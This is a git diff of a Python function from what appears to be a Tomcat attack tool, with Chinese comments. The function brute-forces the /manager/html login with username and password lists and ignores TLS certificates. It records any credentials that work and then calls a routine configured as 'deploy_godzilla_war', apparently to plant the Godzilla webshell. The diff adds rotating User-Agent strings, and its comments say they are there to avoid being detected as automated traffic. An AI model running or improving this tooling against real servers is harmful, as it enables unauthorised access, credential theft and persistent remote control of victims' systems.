@@ -253,26 +253,48 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
     返回:
         tuple: 包含成功登录的URL、用户名和密码的元组
     """
+    # 移除URL末尾的斜杠，确保URL格式一致性
     base_url = url.rstrip('/')
+    # 检查URL是否包含特定路径，如果没有则添加
     if not base_url.endswith('/manager/html'):
         url_with_path = f"{base_url}/manager/html"
     else:
         url_with_path = url
 
+    # 定义一组常见的User-Agent，用于模拟不同的浏览器请求
+    user_agents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
+    ]
+    # 随机选择一个User-Agent，以避免因请求模式一致而被服务器识别为自动化请求
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
+        "User-Agent": random.choice(user_agents)
     }
 
+    # 初始化尝试次数
     attempt = 0
+    # 开始重试循环，直到达到最大重试次数
     while attempt < max_retries:
         try:
+            # 遍历用户名列表
             for username in usernames:
+                # 遍历密码列表
                 for password in passwords:
+                    # 发起GET请求，包含基本认证信息
                     response = requests.get(url=url_with_path, auth=HTTPBasicAuth(username, password), headers=headers,
                                             timeout=10, verify=False)
+                    # 如果登录成功
                     if response.status_code == 200:
+                        # 记录成功登录的信息
                         success_entry = f"{url_with_path} {username}:{password}"
                         logger.info(f"{Fore.RED}[+] 登录成功 {success_entry}{Style.RESET_ALL}")
+                        # 将成功登录的信息写入输出文件
                         with open(output_file, 'a', encoding='utf-8') as f:
                             f.write(success_entry + "\n")
 
@@ -285,21 +307,29 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
                                                 output_file,
                                                 config['retry']['deploy_godzilla_war']['max_retries'],
                                                 config['retry']['deploy_godzilla_war']['retry_delay'])
+                        # 返回成功登录的URL、用户名和密码
                         return (url_with_path, username, password)
                     else:
+                        # 记录登录失败的信息
                         logger.info(
                             f"{Fore.GREEN}[-] 失败: {username}:{password} {Fore.WHITE}({response.status_code}) {Fore.BLUE}{url_with_path}{Style.RESET_ALL}")
-            break  # 如果检查完所有用户密码对则退出循环
+            # 如果检查完所有用户密码对则退出循环
+            break
         except requests.exceptions.RequestException as e:
+            # 记录网站无法访问的警告信息
             logger.warning(
                 f"{Fore.YELLOW}[!] 网站无法访问 {url_with_path} 尝试重新访问 {attempt + 1}/{max_retries}{Style.RESET_ALL}")
-            time.sleep(retry_delay)  # 重试前等待
+            # 重试前等待
+            time.sleep(retry_delay)
+            # 增加重试次数
             attempt += 1
+    # 如果达到最大重试次数，记录错误信息并返回None
     if attempt == max_retries:
         logger.error(
             f"{Fore.CYAN}[*] 最大重试次数已达，无法访问 {url_with_path}，将该 URL 从检测列表中移除 {Style.RESET_ALL}")
         return None  # 返回 None 表示该 URL 无法访问
 
+    # 如果没有成功登录，返回URL和None值
     return url, None, None
 
 
